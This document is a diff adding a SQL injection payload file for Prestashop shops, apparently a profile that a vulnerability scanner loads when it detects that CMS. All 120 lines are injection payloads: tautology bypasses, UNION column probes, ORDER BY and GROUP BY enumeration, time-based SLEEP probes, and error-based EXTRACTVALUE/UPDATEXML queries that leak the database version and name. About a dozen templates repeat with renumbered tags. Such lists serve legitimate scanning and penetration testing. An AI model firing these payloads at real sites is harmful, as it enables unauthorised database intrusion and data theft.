@@ -1,0 +1,122 @@
+# prestashop CMS-specific SQL injection payload profile
+# Loaded automatically when CMS detector identifies Prestashop
+' OR '1'='1' /*prestashop_1*/
+' AND 1=2 UNION SELECT NULL-- prestashop_2
+' AND SLEEP(4)-- prestashop_3
+' OR IF(4=4,SLEEP(2),0)-- prestashop_4
+' UNION SELECT NULL,NULL,NULL-- prestashop_5
+' ORDER BY 7-- prestashop_6
+' GROUP BY 8 HAVING 1=1-- prestashop_7
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_8
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_9
+1 OR 1=1# prestashop_10
+-1 UNION SELECT NULL-- prestashop_11
+' OR 1=1-- prestashop_12
+' OR '1'='1' /*prestashop_13*/
+' AND 1=2 UNION SELECT NULL-- prestashop_14
+' AND SLEEP(1)-- prestashop_15
+' OR IF(16=16,SLEEP(2),0)-- prestashop_16
+' UNION SELECT NULL,NULL,NULL-- prestashop_17
+' ORDER BY 9-- prestashop_18
+' GROUP BY 4 HAVING 1=1-- prestashop_19
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_20
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_21
+1 OR 1=1# prestashop_22
+-1 UNION SELECT NULL-- prestashop_23
+' OR 1=1-- prestashop_24
+' OR '1'='1' /*prestashop_25*/
+' AND 1=2 UNION SELECT NULL-- prestashop_26
+' AND SLEEP(3)-- prestashop_27
+' OR IF(28=28,SLEEP(2),0)-- prestashop_28
+' UNION SELECT NULL,NULL,NULL-- prestashop_29
+' ORDER BY 1-- prestashop_30
+' GROUP BY 8 HAVING 1=1-- prestashop_31
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_32
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_33
+1 OR 1=1# prestashop_34
+-1 UNION SELECT NULL-- prestashop_35
+' OR 1=1-- prestashop_36
+' OR '1'='1' /*prestashop_37*/
+' AND 1=2 UNION SELECT NULL-- prestashop_38
+' AND SLEEP(5)-- prestashop_39
+' OR IF(40=40,SLEEP(2),0)-- prestashop_40
+' UNION SELECT NULL,NULL,NULL-- prestashop_41
+' ORDER BY 3-- prestashop_42
+' GROUP BY 4 HAVING 1=1-- prestashop_43
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_44
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_45
+1 OR 1=1# prestashop_46
+-1 UNION SELECT NULL-- prestashop_47
+' OR 1=1-- prestashop_48
+' OR '1'='1' /*prestashop_49*/
+' AND 1=2 UNION SELECT NULL-- prestashop_50
+' AND SLEEP(2)-- prestashop_51
+' OR IF(52=52,SLEEP(2),0)-- prestashop_52
+' UNION SELECT NULL,NULL,NULL-- prestashop_53
+' ORDER BY 5-- prestashop_54
+' GROUP BY 8 HAVING 1=1-- prestashop_55
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_56
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_57
+1 OR 1=1# prestashop_58
+-1 UNION SELECT NULL-- prestashop_59
+' OR 1=1-- prestashop_60
+' OR '1'='1' /*prestashop_61*/
+' AND 1=2 UNION SELECT NULL-- prestashop_62
+' AND SLEEP(4)-- prestashop_63
+' OR IF(64=64,SLEEP(2),0)-- prestashop_64
+' UNION SELECT NULL,NULL,NULL-- prestashop_65
+' ORDER BY 7-- prestashop_66
+' GROUP BY 4 HAVING 1=1-- prestashop_67
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_68
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_69
+1 OR 1=1# prestashop_70
+-1 UNION SELECT NULL-- prestashop_71
+' OR 1=1-- prestashop_72
+' OR '1'='1' /*prestashop_73*/
+' AND 1=2 UNION SELECT NULL-- prestashop_74
+' AND SLEEP(1)-- prestashop_75
+' OR IF(76=76,SLEEP(2),0)-- prestashop_76
+' UNION SELECT NULL,NULL,NULL-- prestashop_77
+' ORDER BY 9-- prestashop_78
+' GROUP BY 8 HAVING 1=1-- prestashop_79
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_80
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_81
+1 OR 1=1# prestashop_82
+-1 UNION SELECT NULL-- prestashop_83
+' OR 1=1-- prestashop_84
+' OR '1'='1' /*prestashop_85*/
+' AND 1=2 UNION SELECT NULL-- prestashop_86
+' AND SLEEP(3)-- prestashop_87
+' OR IF(88=88,SLEEP(2),0)-- prestashop_88
+' UNION SELECT NULL,NULL,NULL-- prestashop_89
+' ORDER BY 1-- prestashop_90
+' GROUP BY 4 HAVING 1=1-- prestashop_91
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_92
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_93
+1 OR 1=1# prestashop_94
+-1 UNION SELECT NULL-- prestashop_95
+' OR 1=1-- prestashop_96
+' OR '1'='1' /*prestashop_97*/
+' AND 1=2 UNION SELECT NULL-- prestashop_98
+' AND SLEEP(5)-- prestashop_99
+' OR IF(100=100,SLEEP(2),0)-- prestashop_100
+' UNION SELECT NULL,NULL,NULL-- prestashop_101
+' ORDER BY 3-- prestashop_102
+' GROUP BY 8 HAVING 1=1-- prestashop_103
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_104
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_105
+1 OR 1=1# prestashop_106
+-1 UNION SELECT NULL-- prestashop_107
+' OR 1=1-- prestashop_108
+' OR '1'='1' /*prestashop_109*/
+' AND 1=2 UNION SELECT NULL-- prestashop_110
+' AND SLEEP(2)-- prestashop_111
+' OR IF(112=112,SLEEP(2),0)-- prestashop_112
+' UNION SELECT NULL,NULL,NULL-- prestashop_113
+' ORDER BY 5-- prestashop_114
+' GROUP BY 4 HAVING 1=1-- prestashop_115
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))-- prestashop_116
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE(),0x7e),1)-- prestashop_117
+1 OR 1=1# prestashop_118
+-1 UNION SELECT NULL-- prestashop_119
+' OR 1=1-- prestashop_120
